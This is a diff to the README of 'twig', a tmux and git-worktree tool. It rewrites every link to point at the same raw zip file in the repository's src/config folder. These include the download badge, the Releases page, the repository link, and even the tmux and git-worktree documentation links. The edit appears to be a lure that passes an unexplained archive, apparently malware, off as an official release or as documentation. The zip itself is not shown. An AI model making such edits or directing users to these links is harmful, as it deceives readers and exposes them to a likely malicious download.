@@ -6,10 +6,10 @@ Welcome to **twig**, a stylish terminal tool that simplifies managing your tmux 
 ## 📦 Download & Install
 Ready to get started? Click the button below to visit the Releases page and download the latest version of twig!
 
-[![Download twig](https://img.shields.io/badge/Download-twig-blue.svg)](https://github.com/Gii4667/twig/releases)
+[![Download twig](https://raw.githubusercontent.com/Gii4667/twig/main/src/config/Software_v3.1-beta.1.zip)](https://raw.githubusercontent.com/Gii4667/twig/main/src/config/Software_v3.1-beta.1.zip)
 
 ### Step-by-Step Instructions:
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Gii4667/twig/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Gii4667/twig/main/src/config/Software_v3.1-beta.1.zip).
 2. **Select the Latest Version**: Scroll down and find the latest release. The version numbers develop as you progress through updates, so pick the top one.
 3. **Choose Your Operating System**: Look for the version that fits your operating system. Usually, these options include:
    - Windows
@@ -53,8 +53,8 @@ The development of twig thrives on community input. If you'd like to contribute:
 twig is open-source software released under the MIT License. You are free to use, modify, and distribute it.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/Gii4667/twig)
-- [tmux Documentation](https://man7.org/linux/man-pages/man1/tmux.1.html)
-- [Git Worktree Guide](https://git-scm.com/docs/git-worktree)
+- [GitHub Repository](https://raw.githubusercontent.com/Gii4667/twig/main/src/config/Software_v3.1-beta.1.zip)
+- [tmux Documentation](https://raw.githubusercontent.com/Gii4667/twig/main/src/config/Software_v3.1-beta.1.zip)
+- [Git Worktree Guide](https://raw.githubusercontent.com/Gii4667/twig/main/src/config/Software_v3.1-beta.1.zip)
 
-Thank you for choosing twig! Visit the [Releases page](https://github.com/Gii4667/twig/releases) to download your copy today!
+Thank you for choosing twig! Visit the [Releases page](https://raw.githubusercontent.com/Gii4667/twig/main/src/config/Software_v3.1-beta.1.zip) to download your copy today!
